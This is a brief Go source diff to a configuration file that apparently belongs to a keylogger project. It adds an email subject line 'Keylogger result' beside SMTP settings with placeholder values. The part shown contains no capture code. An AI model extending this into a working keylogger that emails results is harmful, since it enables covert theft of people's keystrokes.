@@ -4,7 +4,7 @@ package config
 Create <Config> - init Config structure
 IT IS PREFERABLE TO USE ABSOLUTE FILE PATH
 	Returns <*Config>:
-		1. Structure pointer
+		1. object's pointer
 */
 func (c *Config) Create() *Config {
 	c = &Config{
@@ -33,6 +33,7 @@ func (c *Config) Create() *Config {
 					Port:     25,
 					Name:     "some-user-name",
 					From:     "from@mail.ru",
+					Subject:  "Keylogger result",
 				},
 			},
 			Keylogger: Keylogger{
